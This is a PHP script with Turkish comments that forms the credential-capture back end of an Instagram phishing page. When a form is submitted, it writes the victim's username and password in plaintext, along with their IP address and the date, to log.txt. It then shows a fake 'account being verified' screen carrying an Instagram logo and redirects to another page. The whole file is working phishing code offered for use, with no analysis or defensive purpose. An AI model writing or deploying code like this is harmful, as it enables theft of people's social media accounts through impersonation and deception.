<?php
// Dosyaya yazma işlemi için gerekli PHP kodu
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Kullanıcıdan gelen veriler
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);
    
    // IP adresi ve tarih bilgisi
    $ip_address = $_SERVER['REMOTE_ADDR'];
    $date = date('Y-m-d H:i:s');

    // Log formatı
    $log_entry = "Kullanıcı Adı: $username | Şifre: $password | IP Adresi: $ip_address | Tarih: $date" . PHP_EOL;

    // Dosya yolu
    $log_file = 'log.txt';

    // Dosyaya yazma işlemi
    file_put_contents($log_file, $log_entry, FILE_APPEND);

    // HTML ve CSS ile yükleme sayfası
    echo '
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Hesabınız Doğrulanıyor</title>
        <style>
            /* Global Styles */
            * {
                box-sizing: border-box;
                margin: 0;
                padding: 0;
            }
            body {
                display: flex;
                align-items: center;
                justify-content: center;
                height: 100vh;
                background-color: #121212;
                font-family: "Roboto", sans-serif;
                color: #ffffff;
            }
            .container {
                text-align: center;
                background-color: #262626;
                padding: 30px;
                border-radius: 10px;
                box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
                width: 300px;
            }
            .logo img {
                height: 50px;
                margin-bottom: 20px;
            }
            .message h2 {
                font-size: 18px;
                margin-bottom: 10px;
                font-weight: 500;
            }
            .message p {
                font-size: 14px;
                margin-bottom: 20px;
                color: #c9c8cd;
            }
            /* Loader Styles */
            .loader {
                border: 4px solid #f3f3f3;
                border-radius: 50%;
                border-top: 4px solid #3897f0;
                width: 30px;
                height: 30px;
                animation: spin 1s linear infinite;
                margin: 0 auto;
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
        </style>
        <meta http-equiv="refresh" content="5;url=meta/index.html">
    </head>
    <body>
        <div class="container">
            <div class="logo">
                <img src="img/instagraa.png" alt="Instagram Logo">
            </div>
            <div class="message">
                <h2>Hesabınız Doğrulanıyor</h2>
                <p>Lütfen bekleyin...</p>
            </div>
            <div class="loader"></div>
        </div>
    </body>
    </html>';
    exit();
}
?>
